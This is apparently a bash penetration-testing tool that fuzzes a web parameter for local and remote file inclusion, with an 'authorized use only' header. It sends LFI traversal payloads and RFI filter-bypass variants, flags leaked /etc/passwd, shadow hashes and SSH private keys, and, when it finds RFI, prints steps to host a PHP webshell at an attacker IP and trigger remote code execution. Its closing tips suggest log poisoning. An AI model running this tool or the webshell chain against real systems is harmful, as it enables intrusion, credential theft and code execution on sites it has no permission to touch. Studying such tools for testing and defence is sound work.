#!/usr/bin/env bash
# lfi_rfi_tester.sh — Test a URL parameter for LFI and RFI vulnerabilities
#
# !! FOR AUTHORIZED PENETRATION TESTING AND CTF USE ONLY !!
# Do not use against systems you do not own or have explicit written permission to test.
#
# USAGE:
#   ./lfi_rfi_tester.sh -u "http://target.com/page.php?file=FUZZ"
#   ./lfi_rfi_tester.sh -u "http://target.com/page.php?file=FUZZ" -t lfi
#   ./lfi_rfi_tester.sh -u "http://target.com/page.php?file=FUZZ" -t rfi -r http://attacker.com/shell.txt
#   ./lfi_rfi_tester.sh -u "http://target.com/page.php" -p file -t both
#
# LFI WORDLIST — LFI-Jhaddix.txt from danielmiessler/SecLists, resolved in order:
#   1. -w <path>   explicit path you provide
#   2. Common SecLists install paths (Kali, Homebrew, manual clone)
#   3. Cached copy in /tmp from a prior run
#   4. Downloaded at runtime from GitHub raw content
#
# REQUIREMENTS: curl, grep, sed

set -euo pipefail

# ── Colours ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'

die()    { echo -e "${RED}[!] $*${RESET}" >&2; exit 1; }
info()   { echo -e "${CYAN}[*] $*${RESET}"; }
good()   { echo -e "${GREEN}[+] $*${RESET}"; }
vuln()   { echo -e "${RED}${BOLD}[VULN] $*${RESET}"; }
warn()   { echo -e "${YELLOW}[-] $*${RESET}"; }
detail() { echo -e "${DIM}    $*${RESET}"; }
sep()    { echo -e "${BOLD}$(printf '─%.0s' {1..65})${RESET}"; }

usage() {
    echo -e "${BOLD}lfi_rfi_tester.sh${RESET} — LFI / RFI vulnerability tester"
    echo -e ""
    echo -e "  ${CYAN}-u <url>${RESET}     Target URL with FUZZ placeholder"
    echo -e "               e.g. "http://target/page.php?file=FUZZ""
    echo -e "  ${CYAN}-p <param>${RESET}   Parameter name to inject (alternative to FUZZ in URL)"
    echo -e "  ${CYAN}-t <type>${RESET}    Test type: lfi | rfi | both  (default: both)"
    echo -e "  ${CYAN}-w <path>${RESET}    LFI wordlist path (default: auto-resolve LFI-Jhaddix.txt)"
    echo -e "  ${CYAN}-r <url>${RESET}     Remote URL for RFI canary (default: tries ifconfig.me, ipinfo.io, example.com)"
    echo -e "  ${CYAN}-c <cookie>${RESET}  Cookie string e.g. "PHPSESSID=abc123""
    echo -e "  ${CYAN}-H <header>${RESET}  Extra header e.g. "Authorization: Bearer token""
    echo -e "  ${CYAN}-o <file>${RESET}    Save results to file"
    echo -e "  ${CYAN}-d <delay>${RESET}   Delay between requests in seconds (default: 0)"
    echo -e "  ${CYAN}-x${RESET}           Stop after first confirmed vulnerability"
    echo -e "  ${CYAN}-v${RESET}           Verbose: show all tested payloads"
    echo -e "  ${CYAN}-h${RESET}           This help"
    echo -e ""
    echo -e "${BOLD}Wordlist resolution order (LFI):${RESET}"
    echo -e "  1. -w <path> if supplied"
    echo -e "  2. SecLists install: /usr/share/seclists, /opt/SecLists, ~/SecLists, Homebrew"
    echo -e "  3. Cached /tmp/LFI-Jhaddix.txt from a previous run"
    echo -e "  4. Downloaded at runtime from raw.githubusercontent.com"
    echo -e ""
    echo -e "${BOLD}Examples:${RESET}"
    echo -e "  $0 -u "http://10.10.10.5/index.php?page=FUZZ""
    echo -e "  $0 -u "http://10.10.10.5/index.php" -p page -t lfi -o results.txt"
    echo -e "  $0 -u "http://10.10.10.5/view.php?f=FUZZ" -c "session=xyz" -x"
    echo -e "  $0 -u "http://10.10.10.5/view.php?f=FUZZ" -w ~/wordlists/LFI-Jhaddix.txt"
    exit 0
}

# ── Wordlist resolution ───────────────────────────────────────────────────────
JHADDIX_URL="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt"
JHADDIX_CACHE="/tmp/LFI-Jhaddix.txt"

SECLISTS_CANDIDATES=(
    "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "$HOME/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "$HOME/tools/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/usr/local/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/opt/homebrew/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
)

resolve_wordlist() {
    local user_path="$1"

    # 1. Explicit path from -w
    if [[ -n "$user_path" ]]; then
        [[ -f "$user_path" ]] || { echo -e "${RED}[!] Wordlist not found: $user_path${RESET}" >&2; exit 1; }
        echo "$user_path"
        return
    fi

    # 2. Common SecLists install locations
    for candidate in "${SECLISTS_CANDIDATES[@]}"; do
        if [[ -f "$candidate" ]]; then
            echo -e "${GREEN}[+] Found SecLists at: $candidate${RESET}" >&2
            echo "$candidate"
            return
        fi
    done

    # 3. Cached copy from a previous run
    if [[ -f "$JHADDIX_CACHE" ]]; then
        echo -e "${GREEN}[+] Using cached wordlist: $JHADDIX_CACHE${RESET}" >&2
        echo "$JHADDIX_CACHE"
        return
    fi

    # 4. Download from GitHub
    echo -e "${YELLOW}[-] SecLists not found locally — downloading LFI-Jhaddix.txt from GitHub...${RESET}" >&2
    if curl -fsSL --max-time 30 -o "$JHADDIX_CACHE" "$JHADDIX_URL" 2>/dev/null; then
        local count
        count=$(grep -c . "$JHADDIX_CACHE" 2>/dev/null || echo "?")
        echo -e "${GREEN}[+] Downloaded $count lines → cached at $JHADDIX_CACHE${RESET}" >&2
        echo "$JHADDIX_CACHE"
        return
    fi

    echo -e "${RED}[!] Could not download wordlist. Install SecLists or use -w <path>.${RESET}" >&2
    exit 1
}

# Strip comments and blank lines
lfi_payloads() {
    local wordlist="$1"
    grep -v '^\s*#' "$wordlist" | grep -v '^\s*$'
}

# ── RFI payloads ──────────────────────────────────────────────────────────────
# Generates bypass variants of a remote URL to defeat common include() filters
rfi_payloads() {
    local remote="$1"
    echo "${remote}"                          # plain
    echo "${remote}%00"                       # null byte (PHP < 5.3.4)
    echo "${remote}?"                         # trailing ? defeats suffix filters
    echo "${remote}%3F"                       # URL-encoded ?
    echo "${remote}%23"                       # URL-encoded #
    echo "//${remote#http*://}"               # protocol-relative
    echo "${remote/http:/https:}"             # HTTPS variant
    echo "http:${remote#*:}"                  # double http: bypass
    echo "${remote}%00.php"                   # null byte + extension junk
}


# ── Detection: LFI ───────────────────────────────────────────────────────────
# $1 = response body   $2 = baseline body (normal page response)
# Returns 0 (confirmed hit), 2 (possible/anomalous), 1 (no hit)
detect_lfi() {
    local body="$1" baseline="$2"

    # ── Known-signature checks ────────────────────────────────────────────────

    # Unix /etc/passwd
    if echo "$body" | grep -qE 'root:[x*!]:0:0'; then
        echo "/etc/passwd — root entry found"
        return 0
    fi

    # /etc/shadow
    if echo "$body" | grep -qE ':[0-9]{4,}:[0-9]+:[0-9]+:'; then
        echo "/etc/shadow — password hash format detected"
        return 0
    fi

    # Windows hosts / INI files
    if echo "$body" | grep -qiE '\[fonts\]|\[extensions\]|\[boot loader\]'; then
        echo "Windows INI file content found"
        return 0
    fi

    # PHP source via php://filter (base64 blob)
    if echo "$body" | grep -qE '^[A-Za-z0-9+/]{40,}={0,2}$'; then
        echo "php://filter base64 source disclosure"
        return 0
    fi

    # /proc/self/environ
    if echo "$body" | grep -qE 'PATH=|HTTP_USER_AGENT=|DOCUMENT_ROOT=|SCRIPT_FILENAME='; then
        echo "/proc/self/environ — environment variables leaked"
        return 0
    fi

    # OS release strings
    if echo "$body" | grep -qiE '^(Ubuntu|Debian|CentOS|Fedora|Alpine|Kali|Arch) '; then
        echo "/etc/os-release or /etc/issue content found"
        return 0
    fi

    # Web server log content (useful for log poisoning)
    if echo "$body" | grep -qE '"(GET|POST|HEAD|PUT) /.*HTTP/1\.[01]'; then
        echo "Web server log content found — log poisoning may be possible"
        return 0
    fi

    # SSH private key
    if echo "$body" | grep -q 'BEGIN.*PRIVATE KEY'; then
        echo "SSH private key found"
        return 0
    fi

    # Windows proof/flag file patterns (CTF / OSCP)
    # local.txt and proof.txt are typically a single UUID or short hash line
    if echo "$body" | grep -qiP '^[a-f0-9]{32}$|^[a-f0-9-]{36}$'; then
        echo "Flag/proof file content detected (32 or 36 char hex string)"
        return 0
    fi

    # ── Generic content-change detection ─────────────────────────────────────
    # If none of the above matched, compare response to baseline.
    # A significant size difference means *something* was included.
    if [[ -n "$baseline" ]]; then
        local body_len baseline_len diff
        body_len=${#body}
        baseline_len=${#baseline}
        diff=$(( body_len - baseline_len ))
        # Strip sign for abs value
        local abs_diff=${diff#-}
        if [[ $abs_diff -gt 100 && $body_len -gt $baseline_len ]]; then
            echo "Response is ${diff} bytes larger than baseline — possible file inclusion (verify manually)"
            return 2
        fi
    fi

    return 1
}

# ── Detection: RFI ───────────────────────────────────────────────────────────
# Looks for evidence that the server attempted to fetch a remote URL.
# Three outcome levels:
#   CONFIRMED  — known-good content appeared in the response (example.com marker)
#   POSSIBLE   — PHP error/warning shows the server tried but was blocked
#   NOT VULN   — no evidence of remote fetch attempt
detect_rfi() {
    local body="$1" canary="${2:-}"

    # Level 1 — detect content from the specific canary that was used

    # ifconfig.me returns plain text containing "IP Address:" or similar
    if echo "$body" | grep -qiE 'ip_addr:|Remote IP:|Your IP is|"ip":'; then
        echo "Remote fetch confirmed — IP info service response found in page"
        return 0
    fi

    # example.com title tag
    if echo "$body" | grep -qiE '<title>Example Domain</title>|This domain is for use in illustrative'; then
        echo "Remote fetch confirmed — example.com content found in page"
        return 0
    fi

    # robots.txt markers (if user supplied -r pointing at a robots.txt)
    if echo "$body" | grep -qP '^User-agent:\s|^Disallow:\s|^Sitemap:\s'; then
        echo "Remote fetch confirmed — robots.txt content found in page"
        return 0
    fi

    # Generic: any large block of HTML from a remote page appearing in response
    # If the canary host appears as a link or string in the body, the include worked
    if [[ -n "$canary" ]]; then
        local canary_host
        canary_host=$(echo "$canary" | grep -oP '(?<=://)([^/]+)')
        if [[ -n "$canary_host" ]] && echo "$body" | grep -qF "$canary_host"; then
            echo "Remote fetch confirmed — canary hostname ($canary_host) reflected in response"
            return 0
        fi
    fi

    # Level 2 — PHP error/warning proves the parameter reaches include()
    # even if the fetch was blocked by config or firewall
    if echo "$body" | grep -qiE         '"'"'failed to open stream|allow_url_include|Connection refused|getaddrinfo failed|No route to host|Warning.*include\(|Warning.*require\(|Fatal error.*include'"'"'; then
        echo "POSSIBLE — PHP warning shows parameter reaches include() but fetch was blocked"
        return 2
    fi

    return 1
}


# ── HTTP request ──────────────────────────────────────────────────────────────
send_request() {
    local url="$1" cookie="$2" extra_header="$3"
    local args=(-s -L --max-time 10 --max-redirs 1 -A "Mozilla/5.0")

    [[ -n "$cookie" ]]       && args+=(-b "$cookie")
    [[ -n "$extra_header" ]] && args+=(-H "$extra_header")

    curl "${args[@]}" "$url" 2>/dev/null || true
}

# ── URL builder ───────────────────────────────────────────────────────────────
build_url() {
    local base="$1" param="$2" payload="$3"

    if echo "$base" | grep -q 'FUZZ'; then
        echo "${base/FUZZ/$payload}"
    elif [[ -n "$param" ]]; then
        if echo "$base" | grep -qE "[?&]${param}="; then
            echo "$base" | sed "s/\(${param}=\)[^&]*/\1${payload}/"
        elif echo "$base" | grep -q '?'; then
            echo "${base}&${param}=${payload}"
        else
            echo "${base}?${param}=${payload}"
        fi
    else
        die "No FUZZ placeholder in URL and no -p parameter specified."
    fi
}

# ── Main ──────────────────────────────────────────────────────────────────────
main() {
    local url="" param="" test_type="both" wordlist_path=""
    local remote_url="http://ifconfig.me/all"
    local cookie="" extra_header="" outfile=""
    local delay=0 stop_first=0 verbose=0

    [[ $# -eq 0 ]] && usage

    while getopts "u:p:t:w:r:c:H:o:d:xvh" opt; do
        case "$opt" in
            u) url="$OPTARG" ;;
            p) param="$OPTARG" ;;
            t) test_type="$OPTARG" ;;
            w) wordlist_path="$OPTARG" ;;
            r) remote_url="$OPTARG" ;;
            c) cookie="$OPTARG" ;;
            H) extra_header="$OPTARG" ;;
            o) outfile="$OPTARG" ;;
            d) delay="$OPTARG" ;;
            x) stop_first=1 ;;
            v) verbose=1 ;;
            h) usage ;;
            *) usage ;;
        esac
    done

    command -v curl &>/dev/null || die "curl is required"
    [[ -z "$url" ]] && die "Target URL is required (-u)"
    [[ "$test_type" =~ ^(lfi|rfi|both)$ ]] || die "Invalid type: $test_type (lfi|rfi|both)"

    # ── Resolve LFI wordlist ──────────────────────────────────────────────────
    local resolved_wordlist=""
    if [[ "$test_type" == "lfi" || "$test_type" == "both" ]]; then
        resolved_wordlist=$(resolve_wordlist "$wordlist_path")
        local payload_count
        payload_count=$(lfi_payloads "$resolved_wordlist" | grep -c . || echo "?")
        info "Wordlist : $resolved_wordlist"
        info "Payloads : $payload_count"
    fi

    # ── Baseline ──────────────────────────────────────────────────────────────
    info "Getting baseline response..."
    local baseline_url
    baseline_url=$(build_url "$url" "$param" "BASELINE_NONEXISTENT_12345")
    local baseline
    baseline=$(send_request "$baseline_url" "$cookie" "$extra_header")
    local baseline_len=${#baseline}
    info "Baseline : $baseline_len bytes"

    if [[ -n "$outfile" ]]; then
        echo "lfi_rfi_tester results — $(date)" > "$outfile"
        echo "Target: $url" >> "$outfile"
        echo "Wordlist: ${resolved_wordlist:-n/a}" >> "$outfile"
        echo "---" >> "$outfile"
    fi

    local vuln_count=0 tested=0

    # ── LFI Testing ───────────────────────────────────────────────────────────
    if [[ "$test_type" == "lfi" || "$test_type" == "both" ]]; then
        sep
        info "Starting LFI tests (LFI-Jhaddix.txt)..."
        sep

        while IFS= read -r payload; do
            [[ -z "$payload" || "$payload" == \#* ]] && continue

            local target_url
            target_url=$(build_url "$url" "$param" "$payload")
            local response
            response=$(send_request "$target_url" "$cookie" "$extra_header")
            local resp_len=${#response}
            ((tested++))

            local match="" lfi_exit
            match=$(detect_lfi "$response" "$baseline")
            lfi_exit=$?

            if [[ $lfi_exit -eq 0 ]]; then
                vuln "[LFI CONFIRMED] $payload"
                detail "URL:    $target_url"
                detail "Reason: $match"
                detail "Length: $resp_len bytes (baseline: $baseline_len bytes)"
                echo
                [[ -n "$outfile" ]] && echo "[LFI CONFIRMED] $target_url | $match" >> "$outfile"
                ((vuln_count++))
                [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break; }

            elif [[ $lfi_exit -eq 2 ]]; then
                warn "[LFI POSSIBLE] $payload"
                detail "URL:    $target_url"
                detail "Reason: $match"
                detail "Verify: curl -s "$target_url" | head -50"
                echo
                [[ -n "$outfile" ]] && echo "[LFI POSSIBLE] $target_url | $match" >> "$outfile"
                ((vuln_count++))
                [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break; }

            else
                [[ "$verbose" -eq 1 ]] && detail "No hit: $payload"
            fi

            [[ "$delay" != "0" ]] && sleep "$delay"
        done < <(lfi_payloads "$resolved_wordlist")
    fi

    # ── RFI Testing ───────────────────────────────────────────────────────────
    if [[ "$test_type" == "rfi" || "$test_type" == "both" ]]; then
        sep
        info "Starting RFI tests..."
        sep
        echo ""

        # Canary URLs — plain text, no redirects, unique detectable content.
        # We try each one in sequence so if the server can reach one we get a hit.
        # User can override all of these with -r <url>.
        local -a rfi_canaries
        if [[ "$remote_url" != "http://example.com" ]]; then
            # User supplied their own — use only that
            rfi_canaries=("$remote_url")
        else
            # Default canary list — plain text endpoints, no redirects
            rfi_canaries=(
                "http://ifconfig.me/all"          # returns plain text with IP/UA info
                "http://ipinfo.io/json"           # returns JSON — unique and detectable
                "http://example.com"              # HTML fallback
            )
        fi

        info "Canary URLs to try:"
        for c in "${rfi_canaries[@]}"; do
            detail "  $c"
        done
        warn "RFI requires allow_url_include=On (and allow_url_fopen=On) in PHP"
        echo ""

        local rfi_found=0

        for rfi_probe in "${rfi_canaries[@]}"; do
            info "Testing canary: $rfi_probe"
            local canary_hit=0

            while IFS= read -r payload; do
                [[ -z "$payload" || "$payload" == \#* ]] && continue

                local target_url
                target_url=$(build_url "$url" "$param" "$payload")
                local response
                response=$(send_request "$target_url" "$cookie" "$extra_header")
                local rfi_exit
                ((tested++))

                local match=""
                match=$(detect_rfi "$response" "$rfi_probe")
                rfi_exit=$?

                [[ "$verbose" -eq 1 ]] && detail "[$rfi_exit] $payload"

                if [[ $rfi_exit -eq 0 ]]; then
                    vuln "[RFI CONFIRMED] $payload"
                    detail "Canary : $rfi_probe"
                    detail "URL    : $target_url"
                    detail "Reason : $match"
                    detail "Impact : allow_url_include=On — server fetched and included the remote URL"
                    echo ""
                    echo -e "${YELLOW}  Next steps:${RESET}"
                    echo -e "${YELLOW}  1. Host a webshell: echo '<?php system(\$_GET["c"]); ?>' > shell.php${RESET}"
                    echo -e "${YELLOW}  2. Serve it:        python3 -m http.server 8000${RESET}"
                    echo -e "${YELLOW}  3. Trigger RCE:     curl "http://TARGET/page.php?page=http://YOUR_IP:8000/shell.php&c=id"${RESET}"
                    echo ""
                    [[ -n "$outfile" ]] && echo "[RFI CONFIRMED] $target_url | $rfi_probe | $match" >> "$outfile"
                    ((vuln_count++))
                    rfi_found=1
                    canary_hit=1
                    [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break 2; }
                    break   # found a working payload for this canary — move to next canary

                elif [[ $rfi_exit -eq 2 ]]; then
                    warn "[RFI POSSIBLE] $payload"
                    detail "Canary : $rfi_probe"
                    detail "URL    : $target_url"
                    detail "Reason : $match"
                    echo ""
                    echo -e "${CYAN}  Server tried to fetch the URL but was blocked.${RESET}"
                    echo -e "${CYAN}  This confirms the parameter reaches include() — try your own IP:${RESET}"
                    echo -e "${CYAN}  Re-run: $0 -u "$url" -t rfi -r http://YOUR_IP/test.txt${RESET}"
                    echo ""
                    [[ -n "$outfile" ]] && echo "[RFI POSSIBLE] $target_url | $rfi_probe | $match" >> "$outfile"
                    ((vuln_count++))
                    rfi_found=1
                    canary_hit=1
                    [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break 2; }
                    break

                fi

                [[ "$delay" != "0" ]] && sleep "$delay"
            done < <(rfi_payloads "$rfi_probe")

            # If this canary got a hit, no need to try the others
            [[ "$canary_hit" -eq 1 ]] && break
        done

        if [[ "$rfi_found" -eq 0 ]]; then
            warn "No RFI detected with external canaries."
            warn "If the server has no outbound internet access, try your own IP:"
            warn "  $0 -u "$url" -t rfi -r http://YOUR_IP/test.txt"
        fi
    fi

    # ── Summary ───────────────────────────────────────────────────────────────
    sep
    echo -e "${BOLD}Results: $vuln_count confirmed from $tested requests.${RESET}"
    [[ -n "$outfile" ]] && good "Output saved to: $outfile"

    if [[ "$vuln_count" -gt 0 ]]; then
        echo
        warn "LFI next steps:"
        warn "  • php://filter to read source of other PHP files"
        warn "  • Log poisoning: inject PHP via User-Agent, then include log"
        warn "  • /proc/self/environ if User-Agent reaches environment"
        warn "  • Check readability of /etc/shadow"
        warn "RFI next steps:"
        warn "  • Host a PHP webshell and include via vulnerable param"
        warn "  • Requires allow_url_include=On and allow_url_fopen=On"
    fi
}

main "$@"
